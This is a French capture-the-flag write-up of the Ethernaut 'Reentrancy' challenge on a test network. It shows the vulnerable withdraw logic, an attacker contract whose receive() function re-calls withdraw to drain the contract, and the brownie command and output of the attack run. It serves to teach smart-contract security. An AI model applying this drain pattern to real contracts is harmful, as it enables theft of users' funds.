# Reentrancy

## Objectif
L'objectif de ce challenge est de récupérer tous les fonds du contrat.

## Récupération des fonds
Le nom du challenge nous donne la piste à chercher: il faut regarder sous quelle condition nous pouvons créer une boucle d'appel.

Dans la méthode [`withdraw`](contracts/reentrance.sol#2) nous voyons qu'une fois que le contrat a vérifié que [le `msg.sender` a suffisamment de fond](contracts/reentrance.sol#20), le transfert est effectué:
```
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
```

Dans le cas où `msg.sender` est un `EOA` (External Owned Account) cette façon de faire est valide mais si `msg.sender` est un contrat, sa méthode `receive` sera appellée.

Cette méthode `receive` peut appeller de nouveau `withdraw` est ainsi créer une boucle vidant les fonds:
```
    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(amount);
        }
    }
```

## Exécution du script d'attaque
Afin de pouvoir agir sur la chaine `rinkeby`, il est nécessaire de créer un fichier `.env` contenant la clé de projet [Infura](https://infura.io/) et la valeur de la clé privée du compte utilisé pour le challenge:
```shell
export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
export PRIVATE_KEY='0xDEADBEEFCACA...'
```

En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0xe6BA07257a9321e755184FB2F995e0600E78c16D) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
```bash
$ brownie run scripts/attack.py main "0x97d0Cc9f5F3cE20fDb1d7088CA0d9e8A36e6a033" --network rinkeby
```
```console
Brownie v1.18.1 - Python development framework for Ethereum

ReentrancyProject is the active project.

Running 'scripts/attack.py::main'...
Transaction sent: 0x749c569d58adfa004b6dd18760cb6cf31233f504912c5e29f003e140d765bcc2
  Gas price: 1.000000051 gwei   Gas limit: 256812   Nonce: 250
  ReentranceAttack.constructor confirmed   Block: 10521291   Gas used: 233466 (90.91%)
  ReentranceAttack deployed at: 0xE4D85d55b09Ad00B83a6E06A7f0465B7e59F2fdD

Transaction sent: 0x34589a2b27853c6a01b658210d1b0fc73cbeca9fedca0331b002f25498374fd5
  Gas price: 1.000000051 gwei   Gas limit: 48409   Nonce: 251
  Transaction confirmed   Block: 10521292   Gas used: 44009 (90.91%)

0
Transaction sent: 0x8aaf12d51d0e457930ddc96a14970c711194621f2e29cfa62e2ca04b95ecf1d9
  Gas price: 1.000000051 gwei   Gas limit: 600000   Nonce: 252
  ReentranceAttack.attack confirmed   Block: 10521293   Gas used: 49716 (8.29%)

2000000000000000
Transaction sent: 0x867e79c907a6785deab862fc8329f0601420dda324cadf832ac378eea6a78729
  Gas price: 1.000000051 gwei   Gas limit: 31127   Nonce: 253
  ReentranceAttack.destroy confirmed   Block: 10521294   Gas used: 28298 (90.91%)
```



